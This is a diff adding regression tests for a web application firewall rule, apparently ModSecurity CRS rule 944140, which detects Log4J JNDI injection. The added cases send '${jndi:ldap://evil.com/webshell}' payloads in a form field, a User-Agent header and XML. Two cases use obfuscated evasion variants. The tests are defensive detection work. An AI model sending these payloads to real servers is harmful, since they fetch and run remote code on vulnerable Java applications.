@@ -18,9 +18,84 @@
                 Accept: "*/*"
                 Host: localhost
                 User-Agent: ModSecurity CRS 3 Tests
+                Content-Type: application/x-www-form-urlencoded
               method: POST
               port: 80
               uri: /
               data: foo=${jndi:ldap://evil.com/webshell}
+            output:
+              log_contains: "id \"944140\""
+    -
+      test_title: 944140-2
+      desc: Log4J exploit on User-Agent
+      stages:
+        -
+          stage:
+            input:
+              dest_addr: "127.0.0.1"
+              headers:
+                Accept: "*/*"
+                Host: localhost
+                User-Agent: ModSecurity CRS 3 Tests ${jndi:ldap://evil.com/webshell}
+              method: GET
+              port: 80
+              uri: /
+            output:
+              log_contains: "id \"944140\""
+    -
+      test_title: 944140-3
+      desc: Log4J exploit in XML code
+      stages:
+        -
+          stage:
+            input:
+              dest_addr: "127.0.0.1"
+              headers:
+                Accept: "*/*"
+                Host: localhost
+                User-Agent: ModSecurity CRS 3 Tests
+                Content-Type: application/xml
+              method: POST
+              port: 80
+              uri: /
+              data: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><tag attribute="${jndi:ldap://evil.com/webshell}">"${jndi:ldap://evil.com/webshell}"</tag>
+            output:
+              log_contains: "id \"944140\""
+    -
+      test_title: 944140-4
+      desc: Log4J exploit on arg foo, with evasion
+      stages:
+        -
+          stage:
+            input:
+              dest_addr: "127.0.0.1"
+              headers:
+                Accept: "*/*"
+                Host: localhost
+                User-Agent: ModSecurity CRS 3 Tests
+                Content-Type: application/x-www-form-urlencoded
+              method: POST
+              port: 80
+              uri: /
+              data: foo=${${env:FOO:-j}ndi:ldap://evil.com/webshell}
+            output:
+              log_contains: "id \"944140\""
+    -
+      test_title: 944140-5
+      desc: Log4J exploit on arg foo, with evasion
+      stages:
+        -
+          stage:
+            input:
+              dest_addr: "127.0.0.1"
+              headers:
+                Accept: "*/*"
+                Host: localhost
+                User-Agent: ModSecurity CRS 3 Tests
+                Content-Type: application/x-www-form-urlencoded
+              method: POST
+              port: 80
+              uri: /
+              data: foo=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/webshell}
             output:
               log_contains: "id \"944140\""
